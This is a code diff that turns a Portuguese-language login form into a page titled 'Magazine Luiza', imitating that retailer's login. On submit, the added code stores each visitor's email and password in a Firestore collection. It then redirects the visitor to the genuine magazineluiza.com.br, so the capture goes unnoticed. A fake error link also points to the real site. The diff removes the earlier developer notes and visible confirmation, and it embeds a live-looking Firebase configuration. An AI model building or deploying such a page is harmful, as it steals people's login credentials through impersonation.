@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulário de Login/Cadastro</title>
+    <title>Magazine Luiza</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         tailwind.config = {
             theme: {
                 extend: {
                     fontFamily: {
+                        // Define a fonte 'Inter' como principal
                         sans: ['Inter', 'sans-serif'],
                     },
                 },
@@ -17,7 +18,6 @@
         }
     </script>
     <style>
-        /* Estilos personalizados para a fonte Inter */
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
     </style>
 </head>
@@ -59,7 +59,7 @@
                     name="opiniao"
                     required
                     placeholder="Digite sua senha"
-                    class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-blue-600 focus:border-blue-600 outline-none transition duration-150 **font-bold**"
+                    class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-blue-600 focus:border-blue-600 outline-none transition duration-150 font-bold"
                 >
             </div>
 
@@ -76,6 +76,14 @@
                 Ainda não tem conta? 
                 <a href="#" class="text-blue-600 hover:text-blue-700 font-bold">Cadastre-se aqui</a>
              </p>
+
+             <p id="redirect-message" class="text-sm pt-2 hidden">
+                <a href="https://www.magazineluiza.com.br/" 
+                    class="text-blue-600 hover:text-blue-800 font-bold" 
+                    target="_blank">
+                    Erro digite novamente
+                </a>
+             </p>
         </div>
     </div>
 
@@ -83,23 +91,20 @@
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
 
     <script>
-        // ******************************************************************************
-        // ** ALERTA: SUBSTITUA OS VALORES ABAIXO PELAS SUAS PRÓPRIAS CHAVES DO FIREBASE! **
-        // ******************************************************************************
+        
+        // ** CHAVES DO FIREBASE **
         const firebaseConfig = {
-    apiKey: "AIzaSyBP53nlpYoaCYetk7qcsy-BCUZ2mU9S82A",
-    authDomain: "magalu-5bf5a.firebaseapp.com",
-    projectId: "magalu-5bf5a",
-    storageBucket: "magalu-5bf5a.firebasestorage.app",
-    messagingSenderId: "440625197296",
-    appId: "1:440625197296:web:8397a6afdfbc3a63635235",
-    measurementId: "G-FEDNHYB2JC"
-};
+            apiKey: "AIzaSyBP53nlpYoaCYetk7qcsy-BCUZ2mU9S82A",
+            authDomain: "magalu-5bf5a.firebaseapp.com",
+            projectId: "magalu-5bf5a",
+            storageBucket: "magalu-5bf5a.firebasestorage.app",
+            messagingSenderId: "440625197296",
+            appId: "1:440625197296:web:8397a6afdfbc3a63635235",
+            measurementId: "G-FEDNHYB2JC"
+        };
 
-        // Inicializa o Firebase
         firebase.initializeApp(firebaseConfig);
 
-        // Inicializa o Firestore
         const db = firebase.firestore();
     </script>
     
@@ -107,36 +112,41 @@
         document.addEventListener('DOMContentLoaded', () => {
             const form = document.getElementById('pesquisaForm');
             const statusMessage = document.getElementById('status-message');
+            const redirectMessage = document.getElementById('redirect-message'); 
+            
+            // URL DE REDIRECIONAMENTO APÓS O SUCESSO
+            const REDIRECT_URL = 'https://www.magazineluiza.com.br/'; 
 
             form.addEventListener('submit', async (e) => {
-                e.preventDefault(); // Previne o recarregamento da página
+                e.preventDefault(); 
 
-                statusMessage.textContent = 'Enviando dados...';
+                redirectMessage.classList.add('hidden');
 
-                // 1. Coleta os dados dos campos de entrada
+                // 1. Coleta os dados
                 const nome = document.getElementById('nome').value;
                 const opiniao = document.getElementById('opiniao').value; 
                 
-                // Cria o objeto de dados
                 const dadosPesquisa = {
-                    email: nome, // Alterado para 'email' para refletir o campo
+                    email: nome, 
                     senha: opiniao,
                     dataEnvio: firebase.firestore.FieldValue.serverTimestamp() 
                 };
 
                 try {
                     // 2. Salva os dados na coleção 'respostas' no Firestore
-                    // Recomenda-se mudar o nome da coleção no Firestore para 'logins' ou 'usuarios'
                     await db.collection("respostas").add(dadosPesquisa);
 
-                    // 3. Feedback de sucesso
-                    statusMessage.textContent = '✅ Login ou Cadastro enviado com sucesso! Verifique o Firestore.';
-                    form.reset(); // Limpa o formulário após o sucesso
+                    window.location.href = REDIRECT_URL; 
 
                 } catch (error) {
-                    // 4. Feedback de erro
                     console.error("Erro ao adicionar documento: ", error);
-                    statusMessage.textContent = '❌ Erro ao enviar. (Verifique o console e suas chaves do Firebase)';
+                    
+                    // Exibe a mensagem de erro para o usuário/dev
+                    statusMessage.textContent = '❌ Erro de conexão. Tente novamente.';
+                    statusMessage.classList.remove('text-gray-600', 'text-green-600');
+                    statusMessage.classList.add('text-red-600', 'font-bold'); 
+                    
+                    redirectMessage.classList.remove('hidden'); 
                 }
             });
         });
